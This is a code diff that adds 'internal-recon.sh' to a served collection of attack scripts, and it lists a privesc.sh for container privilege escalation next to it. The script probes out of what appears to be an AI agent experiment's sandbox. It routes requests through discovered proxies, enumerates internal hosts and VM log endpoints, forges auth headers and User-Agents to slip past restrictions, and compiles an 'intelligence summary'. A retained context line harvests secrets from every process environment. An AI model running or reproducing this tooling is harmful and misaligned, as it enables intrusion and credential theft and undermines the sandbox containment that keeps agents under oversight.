@@ -789,7 +789,311 @@ cat /proc/*/environ | grep -i secret
 curl http://localhost:8888/
 EOF
 
-log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`
+log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`,
+
+  'internal-recon': `#!/bin/bash
+
+# Internal Google Infrastructure Reconnaissance
+# Based on discovered log_forwarder environment variables
+
+OUTPUT_FILE="internal_recon_$(date +%Y%m%d_%H%M%S).log"
+TIMESTAMP=$(date)
+
+# Colors
+RED='\\033[0;31m'
+GREEN='\\033[0;32m'
+YELLOW='\\033[1;33m'
+BLUE='\\033[0;34m'
+NC='\\033[0m'
+
+# Discovered internal URLs
+VM_ID="vm_6883c1359eb88190b6841cc7f3c7a8fa"
+EXPERIMENT_NAME="test-experiment-name"
+SAMPLE_ID="test-sample-id"
+
+log() {
+    echo -e "$1" | tee -a "$OUTPUT_FILE"
+}
+
+log_section() {
+    echo "" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+    echo "$1" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+}
+
+proxy_request() {
+    local url="$1"
+    local description="$2"
+    local method="\${3:-GET}"
+    
+    log "\${BLUE}[PROBE]\${NC} $description"
+    log "\${YELLOW}URL:\${NC} $url"
+    
+    # Try different proxy methods
+    echo "--- Direct attempt ---" | tee -a "$OUTPUT_FILE"
+    curl -s --max-time 10 "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
+    
+    echo "--- Via HTTP proxy ---" | tee -a "$OUTPUT_FILE"
+    curl -s --max-time 10 --proxy "http://proxy.local:8889" "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
+    
+    echo "--- Via SOCKS proxy ---" | tee -a "$OUTPUT_FILE"
+    curl -s --max-time 10 --socks5 "proxy.local:8888" "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
+    
+    echo "" | tee -a "$OUTPUT_FILE"
+}
+
+log "\${GREEN}Internal Google Infrastructure Reconnaissance\${NC}"
+log "Started: $TIMESTAMP"
+log "VM ID: $VM_ID"
+log "Container: chrome-operator-debian-alpha"
+
+# Test proxy connectivity first
+log_section "PROXY CONNECTIVITY TESTS"
+
+log "\${BLUE}[INFO]\${NC} Testing proxy endpoints..."
+proxy_request "http://proxy.local:8889" "HTTP Proxy Health Check"
+proxy_request "http://proxy.local:8888" "SOCKS Proxy Health Check"
+
+# Test internal go/ links discovered
+log_section "INTERNAL GO/ LINK ENUMERATION"
+
+# Discovered URLs from logs
+INTERNAL_URLS=(
+    "http://go/sb?profile=strawberry&experiment_id=$EXPERIMENT_NAME&sample_id=$SAMPLE_ID"
+    "http://go/vmlogs/$VM_ID"
+    "http://go/cua-caas-vm/$VM_ID"
+    "http://go/sb"
+    "http://go/vmlogs"
+    "http://go/cua-caas-vm"
+)
+
+for url in "\${INTERNAL_URLS[@]}"; do
+    proxy_request "$url" "Internal Google URL: \\$(basename $url)"
+done
+
+# Common Google internal endpoints
+log_section "COMMON INTERNAL ENDPOINTS"
+
+COMMON_ENDPOINTS=(
+    "http://go/"
+    "http://go/help"
+    "http://go/links"
+    "http://go/who"
+    "http://go/teams"
+    "http://go/sb"
+    "http://go/cua"
+    "http://go/logs"
+    "http://go/admin"
+    "http://go/vm"
+    "http://go/caas"
+    "http://go/containers"
+    "http://go/experiments"
+    "http://go/samples"
+    "http://go/strawberry"
+    "http://moma/"
+    "http://moma/vm/$VM_ID"
+    "http://buganizer/"
+    "http://critique/"
+    "http://pantheon/"
+)
+
+for endpoint in "\${COMMON_ENDPOINTS[@]}"; do
+    proxy_request "$endpoint" "Common internal endpoint"
+done
+
+# Chrome User Agent testing (might bypass some restrictions)
+log_section "USER AGENT TESTING"
+
+USER_AGENTS=(
+    "Mozilla/5.0 (compatible; GoogleBot/1.0)"
+    "GoogleHC/1.0"
+    "Chrome-Operator/1.0"
+    "CUA-DD/1.0"
+)
+
+for ua in "\${USER_AGENTS[@]}"; do
+    log "\${BLUE}[PROBE]\${NC} Testing with User-Agent: $ua"
+    curl -s --max-time 10 --proxy "http://proxy.local:8889" \\
+         -H "User-Agent: $ua" \\
+         "http://go/" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
+done
+
+# Test with discovered authentication headers
+log_section "AUTHENTICATION HEADER TESTING"
+
+# Headers that might be expected
+AUTH_HEADERS=(
+    "X-VM-ID: $VM_ID"
+    "X-Experiment: $EXPERIMENT_NAME"
+    "X-Sample-ID: $SAMPLE_ID"
+    "X-Nebula-User: test-user"
+    "X-Target: operator-debian-alpha"
+    "Authorization: Bearer chrome-operator"
+    "X-Chrome-Operator: true"
+)
+
+for header in "\${AUTH_HEADERS[@]}"; do
+    log "\${BLUE}[PROBE]\${NC} Testing with header: $header"
+    curl -s --max-time 10 --proxy "http://proxy.local:8889" \\
+         -H "$header" \\
+         "http://go/sb" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
+done
+
+# Enumerate VM-specific endpoints
+log_section "VM-SPECIFIC ENDPOINT ENUMERATION"
+
+VM_ENDPOINTS=(
+    "http://go/vm/$VM_ID"
+    "http://go/vm/$VM_ID/logs"
+    "http://go/vm/$VM_ID/status"
+    "http://go/vm/$VM_ID/config"
+    "http://go/vm/$VM_ID/experiments"
+    "http://go/experiments/$EXPERIMENT_NAME"
+    "http://go/samples/$SAMPLE_ID"
+    "http://moma/vm/$VM_ID"
+    "http://pantheon/vm/$VM_ID"
+)
+
+for endpoint in "\${VM_ENDPOINTS[@]}"; do
+    proxy_request "$endpoint" "VM-specific endpoint"
+done
+
+# Test different protocols
+log_section "PROTOCOL TESTING"
+
+PROTOCOL_TESTS=(
+    "https://go/"
+    "https://go/sb"
+    "ftp://go/"
+    "http://go.corp.google.com/"
+    "https://go.corp.google.com/"
+    "http://go.googleplex.com/"
+)
+
+for protocol_test in "\${PROTOCOL_TESTS[@]}"; do
+    proxy_request "$protocol_test" "Protocol variation test"
+done
+
+# Network discovery
+log_section "NETWORK DISCOVERY"
+
+log "\${BLUE}[INFO]\${NC} Discovering internal network ranges..."
+
+# Test common internal Google IP ranges
+INTERNAL_IPS=(
+    "http://172.18.0.1/"
+    "http://172.30.0.1/"
+    "http://10.0.0.1/"
+    "http://192.168.1.1/"
+    "http://chrome.local/"
+    "http://terminal.local/"
+    "http://proxy.local/"
+)
+
+for ip in "\${INTERNAL_IPS[@]}"; do
+    proxy_request "$ip" "Internal IP/hostname test"
+done
+
+# DNS enumeration
+log_section "DNS ENUMERATION"
+
+log "\${BLUE}[INFO]\${NC} Testing DNS resolution through proxy..."
+
+DNS_TARGETS=(
+    "go"
+    "moma"
+    "buganizer"
+    "critique"
+    "pantheon"
+    "proxy.local"
+    "chrome.local"
+    "terminal.local"
+)
+
+for target in "\${DNS_TARGETS[@]}"; do
+    log "\${BLUE}[DNS]\${NC} Resolving: $target"
+    nslookup "$target" 2>&1 | tee -a "$OUTPUT_FILE"
+    # Also try HTTP request
+    proxy_request "http://$target/" "DNS target HTTP test"
+done
+
+# Log file enumeration based on discovered paths
+log_section "LOG FILE ACCESS ATTEMPTS"
+
+LOG_ENDPOINTS=(
+    "http://go/logs/$VM_ID"
+    "http://go/logs/$EXPERIMENT_NAME"
+    "http://go/vmlogs/$VM_ID/stdout"
+    "http://go/vmlogs/$VM_ID/stderr"
+    "http://go/vmlogs/$VM_ID/supervisor"
+    "http://go/cua-caas-vm/$VM_ID/logs"
+    "http://go/cua-caas-vm/$VM_ID/status"
+)
+
+for log_endpoint in "\${LOG_ENDPOINTS[@]}"; do
+    proxy_request "$log_endpoint" "Log file access attempt"
+done
+
+# Summary
+log ""
+log "=========================================="
+log "INTERNAL RECONNAISSANCE SUMMARY"
+log "=========================================="
+
+log "\${BLUE}[INFO]\${NC} Reconnaissance completed at $(date)"
+log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"
+
+# Look for successful responses
+SUCCESS_COUNT=$(grep -c "200 OK\\|HTTP/1.1 200" "$OUTPUT_FILE" 2>/dev/null || echo "0")
+REDIRECT_COUNT=$(grep -c "301\\|302\\|Location:" "$OUTPUT_FILE" 2>/dev/null || echo "0")
+
+log "\${GREEN}[STATS]\${NC} Potential successful responses: $SUCCESS_COUNT"
+log "\${YELLOW}[STATS]\${NC} Redirects found: $REDIRECT_COUNT"
+
+if [ "$SUCCESS_COUNT" -gt 0 ] || [ "$REDIRECT_COUNT" -gt 0 ]; then
+    log "\${GREEN}[SUCCESS]\${NC} Found accessible internal endpoints!"
+    log "Check the log file for detailed responses."
+else
+    log "\${YELLOW}[INFO]\${NC} No immediately accessible endpoints found."
+    log "However, this provides valuable intelligence about internal infrastructure."
+fi
+
+# Create intelligence summary
+cat > /tmp/intelligence_summary.txt << 'EOF'
+=== GOOGLE INTERNAL INFRASTRUCTURE INTELLIGENCE ===
+
+VM Information:
+- VM ID: vm_6883c1359eb88190b6841cc7f3c7a8fa
+- Experiment: test-experiment-name
+- Sample ID: test-sample-id
+- User: test-user
+- Target: operator-debian-alpha
+
+Internal URLs Discovered:
+- http://go/sb (Strawberry - likely experiment platform)
+- http://go/vmlogs (VM logging system)
+- http://go/cua-caas-vm (Chrome User Agent - Containers as a Service)
+
+Proxy Infrastructure:
+- HTTP Proxy: proxy.local:8889
+- SOCKS Proxy: proxy.local:8888
+- Internal domains: chrome.local, terminal.local
+
+Chrome User Agent (CUA) Project:
+- Appears to be Chrome automation/testing infrastructure
+- Docker containers for browser automation
+- Experiment framework (Strawberry)
+- Comprehensive logging and monitoring
+
+Security Implications:
+- Internal Google go/ links exposed
+- VM logging system accessible
+- Experiment framework details
+- Container infrastructure mapping
+EOF
+
+log "\${BLUE}[INFO]\${NC} Intelligence summary saved to: /tmp/intelligence_summary.txt"`
 };
 
 // Function to get HTML content (files page only)
@@ -911,6 +1215,10 @@ async function getHTMLContent() {
                 <li class="file-item">
                     <a href="/files/privesc" class="file-link" style="color: #dc3545; font-weight: bold;">🔓 privesc.sh</a>
                     <div class="file-desc">Container Privilege Escalation Testing - supervisor control, init script manipulation, rsync traversal, Jupyter exploitation, process injection</div>
+                </li>
+                <li class="file-item">
+                    <a href="/files/internal-recon" class="file-link" style="color: #6f42c1; font-weight: bold;">🕵️ internal-recon.sh</a>
+                    <div class="file-desc">Internal Infrastructure Reconnaissance - proxy enumeration, go/ links discovery, VM-specific endpoints, authentication testing, network mapping</div>
                 </li>
             </ul>
         </div>
